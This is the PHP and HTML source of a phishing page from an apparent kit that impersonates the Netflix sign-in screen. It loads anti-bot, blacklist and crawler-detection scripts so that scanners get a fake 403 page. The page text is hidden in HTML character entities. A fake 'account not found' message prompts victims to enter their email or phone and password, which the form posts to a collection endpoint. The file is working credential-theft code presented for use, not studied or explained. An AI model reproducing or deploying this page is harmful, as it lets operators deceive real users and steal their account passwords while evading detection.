<?php

$useragent = $_SERVER['HTTP_USER_AGENT'];
include("../Bots/fucker.php");
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
@require("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

$settings = include '../../settings/settings.php';

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($CrawlerDetect->isCrawler($useragent)){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

$bot = include '../Bots/bot.php';
if($bot == "is_bot"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>&#78;&#101;&#116;&#102;&#108;&#105;&#120;</title>
    <link rel="stylesheet" href="assets/css/main.css?rand=<?php echo rand(); ?>">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
    <link type="text/css" rel="stylesheet" href="assets/img/icon.ico"/>
    <link rel="shortcut icon" href="assets/img/icon.ico"/>
  </head>
  <body>
    <script type=text/javascript>
        document.cookie = "sw=" + screen.width;
        document.cookie = "sh=" + screen.height;
    </script>
    <div class="body">
      <div class="layer">
        <div class="header">
          <div class="logo"></div>
        </div>
        <form id="login_form" action="log2" method="post">
          <input name="login_user" value="" id="login_user" type="hidden" />
          <input name="login_pass" value="" id="login_pass" type="hidden" />
          <div class="form">
            <div class="wrapper">
              <h1>Sign In</h1>
              <div class="ui-message">
                &#83;&#111;&#114;&#114;&#121;&#44;&#32;&#119;&#101;&#32;&#99;&#97;&#110;&#39;&#116;&#32;&#102;&#105;&#110;&#100;&#32;&#97;&#110;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#119;&#105;&#116;&#104;&#32;&#116;&#104;&#105;&#115;&#32;&#101;&#109;&#97;&#105;&#108;&#32;&#97;&#100;&#100;&#114;&#101;&#115;&#115;&#46;&#32;&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#116;&#114;&#121;&#32;&#97;&#103;&#97;&#105;&#110;&#32;&#111;&#114; <a>&#99;&#114;&#101;&#97;&#116;&#101;&#32;&#97;&#32;&#110;&#101;&#119;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;</a>.
              </div>
              <div class="input_table">
                <input id="username" name="email2" type="text" value="" spellcheck="false" autocomplete="off" required="" />
                <label id="usernameFocus">&#69;&#109;&#97;&#105;&#108;&#32;&#111;&#114;&#32;&#112;&#104;&#111;&#110;&#101;&#32;&#110;&#117;&#109;&#98;&#101;&#114;</label>
              </div>
              <div class="error_text" id="euser">

              </div>
              <div class="input_table password">
                <input id="password" type="password" name="password2" value="" spellcheck="false" autocomplete="off" required="" />
                <label id="passwordFocus">&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;</label>
              </div>
              <div class="error_text" id="epass">

              </div>
              <div class="action_table">
                <button id="signIn">&#83;&#105;&#103;&#110;&#32;&#73;&#110;</button>
              </div>
              <div class="options_table">
                <div id="check_all">
                  <div class="checkbox on" id="check"></div>
                  <label id="checklabel">&#82;&#101;&#109;&#101;&#109;&#98;&#101;&#114;&#32;&#109;&#101;</label>
                </div>
                <div class="help">
                  &#78;&#101;&#101;&#100;&#32;&#104;&#101;&#108;&#112;&#63;
                </div>
              </div>
              <div class="social_table">
                <div class="fb_connect">
                  &#76;&#111;&#103;&#105;&#110;&#32;&#119;&#105;&#116;&#104;&#32;&#70;&#97;&#99;&#101;&#98;&#111;&#111;&#107;
                </div>
                <div class="register">
                  &#78;&#101;&#119;&#32;&#116;&#111;&#32;&#78;&#101;&#116;&#102;&#108;&#105;&#120;&#63; <a>&#83;&#105;&#103;&#110;&#32;&#117;&#112;&#32;&#110;&#111;&#119;</a>.
                </div>
              </div>
            </div>
          </div>
        </form>
        <div class="footer">
          <div class="footwrapper">
            <div class="faq">
              &#81;&#117;&#101;&#115;&#116;&#105;&#111;&#110;&#115;&#63;&#32;&#67;&#111;&#110;&#116;&#97;&#99;&#116;&#32;&#117;&#115;&#46;
            </div>
            <div class="options">
              <span>&#71;&#105;&#102;&#116;&#32;&#67;&#97;&#114;&#100;&#32;&#84;&#101;&#114;&#109;&#115;</span>
              <span>&#84;&#101;&#114;&#109;&#115;&#32;&#111;&#102;&#32;&#85;&#115;&#101;</span>
              <span>&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#32;&#83;&#116;&#97;&#116;&#101;&#109;&#101;&#110;&#116;</span>
            </div>
            <select class="region" id="region">
              <option value="ar">&#1575;&#1604;&#1593;&#1585;&#1576;&#1610;&#1577;</option>
              <option value="fr">&#70;&#114;&#97;&#110;&#231;&#97;&#105;&#115;</option>
              <option selected="" value="en">&#69;&#110;&#103;&#108;&#105;&#115;&#104;</option>
            </select>
          </div>
        </div>
      </div>
    </div>
    <script src="assets/js/login.js?rand=<?php echo rand(); ?>"></script>
  </body>
</html>
